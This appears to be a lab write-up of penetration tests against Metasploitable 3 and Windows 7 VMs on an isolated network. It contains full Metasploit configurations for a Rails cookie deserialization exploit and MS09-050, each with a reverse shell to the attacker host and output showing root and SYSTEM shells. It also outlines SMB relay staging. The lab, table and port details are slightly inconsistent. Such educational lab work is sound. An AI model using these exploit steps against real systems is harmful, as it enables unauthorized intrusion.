# Penetration Testing — Compromising Multiple Operating Systems

**Environment:** Kali Linux attacking Metasploitable 3 (Linux & Windows), Windows 7  
**Tools Used:** `nmap`, `searchsploit`, Metasploit, `msfvenom`, `netcat`, `nikto`, `enum4linux`, `sqlmap`, `smbclient`

---

## Overview

This assessment required successfully exploiting four different virtual machines across Linux and Windows environments. Each exploit required independent reconnaissance, vulnerability identification, and exploitation — with no pre-defined steps to follow. One documented attempt is an intentional **failed exploit**, included to demonstrate real-world analysis of why an attack surface did not exist.

---

## Lab Environment

| Machine | OS | IP | Role |
|---------|----|----|------|
| Kali Linux | Kali (Attacker) | 10.0.5.10 | Attack platform |
| Metasploitable 3 Linux | Ubuntu 14.04 | 10.0.5.6 | Target 1 & 3 |
| Metasploitable 3 Windows | Windows Server 2008 R2 | 10.0.5.4 | Target 2 |
| Windows 7 | Windows 7 SP1 | 10.0.5.8 | Target 4 |

All machines ran on an isolated NAT network (`MultimachineNAT`, `10.0.5.0/24`). No traffic left the virtual environment.

---

## Target 1 — Metasploitable 3 Linux: WEBrick Ruby Deserialization → Root Shell

### Reconnaissance

An aggressive Nmap scan was run to enumerate all open ports, services, and version information:

```bash
nmap -sC -sV -T4 10.0.5.6
```

**Key findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 6.6.1p1 | Ubuntu |
| 80 | HTTP | Apache 2.4.7 | Exposes `/drupal`, `/phpmyadmin`, `/payroll_app.php` |
| 445 | SMB | Samba 4.3.11 | Potential target |
| 3306 | MySQL | Unauthorized | |
| **8181** | **HTTP** | **WEBrick 1.3.1 (Ruby 2.3.7)** | **Vulnerable** |

### Initial Attempt: Samba `is_known_pipename` (Failed)

Searchsploit identified a known exploit for Samba 4.3.11:

```bash
searchsploit samba 4.3.11
# Result: linux/remote/42084.rb — is_known_pipename() Arbitrary Module Load
```

The exploit was loaded in Metasploit and configured, but the available payload (`cmd/unix/interact`) did not produce a usable shell. An attempt to use a custom reverse shell via a Perl exploit script (msfvenom shellcode injection) was made — however, none of the three Samba shares (`print$`, `public`, `IPC$`) were writable, preventing the exploit from triggering.

**Lesson:** Not every identified vulnerability is exploitable in practice. Enumeration of write access is a necessary pre-exploitation step.

### Pivot: WEBrick Deserialization Exploit (Success)

Nikto scan of port 8181 revealed the WEBrick service was outdated and misconfigured:

```bash
nikto -h http://10.0.5.6:8181
```

Browsing to `http://10.0.5.6:8181/flag` revealed a hint: the `/flag` route returns a flag if the `_metasploitable` cookie contains the correct value — but cookies are signed.

**Step 1 — Extract the signed cookie** using browser dev tools / curl.

**Step 2 — Decode the cookie** to extract the cookie secret:

```bash
python3 -c "import urllib.parse as ul; print(ul.unquote_plus('BAh7B0kiD3Nl...')
.split('--')[0])" | base64 -d
```

**Extracted secret:** `a7aebc287bba0ee4e64f947415a94e5f`

**Step 3 — Configure Metasploit Rails deserialization exploit:**

```
use exploit/multi/http/rails_secret_deserialization
set RHOSTS 10.0.5.6
set RPORT 8181
set SECRET a7aebc287bba0ee4e64f947415a94e5f
set COOKIE_NAME _metasploitable
set LHOST 10.0.5.10
set LPORT 4444
set PAYLOAD ruby/shell_reverse_tcp
run
```

### Result ✅

```
[*] Command shell session 1 opened (10.0.5.10:5555 → 10.0.5.6:36535)
uid=0(root) gid=0(root) groups=0(root)
hostname: metasploitable3-ub1404
```

**Root shell obtained.** The deserialization vulnerability allowed arbitrary Ruby object injection through the signed cookie, which was decoded and re-signed with the extracted secret.

---

## Target 2 — Metasploitable 3 Windows: MS09-050 SMB → Meterpreter Shell

### Reconnaissance

```bash
nmap -sC -sV -T4 10.0.5.4
```

**Key findings:**

| Port | Service | Notes |
|------|---------|-------|
| 21 | FTP | Microsoft ftpd |
| 22 | SSH | OpenSSH 7.1 |
| 80 | HTTP | Microsoft IIS 7.5 |
| **445** | **SMB** | **Windows Server 2008 R2** — target |
| 3306 | MySQL | 5.5.20 |
| 4848 | HTTPS | Oracle GlassFish 4.0 |

### Vulnerability Identification

```bash
searchsploit smb2 windows
```

Multiple results returned. Targeting **MS09-050** (CVE-2009-3103) — SMBv2 Negotiate ProcessID Function Table Dereference, affecting Windows Vista/2008.

The exploit module ID was identified by copying the exploit and reading its metadata:

```bash
searchsploit -m windows/remote/16363.rb
cat 16363.rb
# $Id: ms09_050_smb2_negotiate_func_index.rb
```

### Exploitation

```
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set RHOSTS 10.0.5.4
set LPORT 4444
set LHOST 10.0.5.10
run
```

### Result ✅

```
[*] Meterpreter session 1 opened (10.0.5.10:4444 → 10.0.5.4:50270)
meterpreter > shell
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32>
```

**Meterpreter shell obtained**, then escalated to a full Windows command shell. The MS09-050 vulnerability exploits a memory corruption flaw in Windows' SMBv2 implementation, allowing remote code execution as SYSTEM without authentication.

---

## Target 3 — Ubuntu 20.04: SQL Injection Attempt (Documented Failure)

### Reconnaissance

```bash
nmap -sC -sV -T4 10.0.5.7
```

**Findings:** Port 80 open running Apache 2.4.41 on Ubuntu. No dynamic parameters or forms visible on the default page.

### Attempted Exploit: SQL Injection via sqlmap

```bash
sqlmap -u http://10.0.5.7/ --batch
```

**Result:** `CRITICAL: no parameter(s) found for testing`

### Why It Failed

SQL injection requires a dynamic attack surface — query parameters (`?id=1`), form inputs, or API endpoints that pass user input to a database backend. The Apache default page serves only static content with no such surface.

**This was an intentional learning exercise in attack surface enumeration.** A real-world attacker would continue by:
1. Running directory brute-forcing (`gobuster`, `dirb`) to find hidden endpoints
2. Checking for exposed APIs or admin panels
3. Testing other ports and services

**Lesson:** Tool output is only as useful as the attack surface you point it at. Reconnaissance depth determines exploit opportunity.

---

## Target 4 — Windows 7 SP1: SMB Enumeration (Subsystem Access)

### Reconnaissance

```bash
nmap -sC -sV -T4 10.0.5.8
```

**Key findings:**

| Port | Service | Details |
|------|---------|---------|
| **445** | **SMB** | **Windows 7 Professional SP1** — message signing disabled |
| 135 | MSRPC | |
| 139 | NetBIOS | |

SMB security mode showed `message signing: disabled (dangerous, but default)` — a misconfiguration that enables relay attacks.

### Enumeration

```bash
enum4linux -a 10.0.5.8
```

**Results:**

| Finding | Value | Significance |
|---------|-------|-------------|
| Workgroup | WORKGROUP | Domain information |
| Computer Name | ADMIN-PC | Hostname for targeting |
| Anonymous Sessions | **Allowed** | No authentication required for null session |
| Credential/Share Access | Denied | Could not enumerate shares with anonymous session |

### Analysis

While full share access was denied, the **anonymous SMB null session** was permitted. This is a real-world misconfiguration that enables:

- **OSINT / Reconnaissance:** Hostname, workgroup, and OS version confirmed without credentials
- **Lateral movement preparation:** Workgroup membership reveals network topology
- **Relay attack staging:** Disabled message signing enables SMB relay (NTLM capture) using tools like `responder` + `ntlmrelayx`

This constitutes subsystem-level access — not a full shell, but information that would be leveraged in a real engagement for further attack planning.

---

## Summary

| Target | OS | Exploit | Result |
|--------|----|---------|--------|
| Metasploitable 3 Linux | Ubuntu 14.04 | Rails Cookie Deserialization | ✅ Root shell |
| Metasploitable 3 Windows | Server 2008 R2 | MS09-050 SMBv2 | ✅ SYSTEM shell |
| Ubuntu 20.04 | Ubuntu | SQL Injection (sqlmap) | ❌ No attack surface |
| Windows 7 SP1 | Windows 7 | SMB Null Session Enum | ⚠️ Subsystem access |

---

## Key Takeaways

| Concept | Lesson |
|---------|--------|
| **Adapt when blocked** | The Samba exploit failed — pivoting to WEBrick led to a root shell |
| **Read the error** | Runtime errors during malware execution often indicate missing dependencies, not invulnerability |
| **Document failures** | Failed exploits reveal attack surface boundaries and inform next steps |
| **Null sessions matter** | Anonymous SMB access is a real finding even without a shell |
| **Deserialization is dangerous** | Signed cookies with extractable secrets are as dangerous as unsigned ones |

---

## Tools Reference

| Tool | Purpose |
|------|---------|
| `nmap` | Network reconnaissance, port/service/version enumeration |
| `searchsploit` | Local exploit database search |
| Metasploit (`msfconsole`) | Exploit framework, payload delivery |
| `msfvenom` | Custom payload generation |
| `netcat` | Reverse shell listener |
| `nikto` | Web server vulnerability scanning |
| `enum4linux` | SMB/NetBIOS enumeration |
| `sqlmap` | Automated SQL injection testing |
| `smbclient` | SMB share enumeration and access |
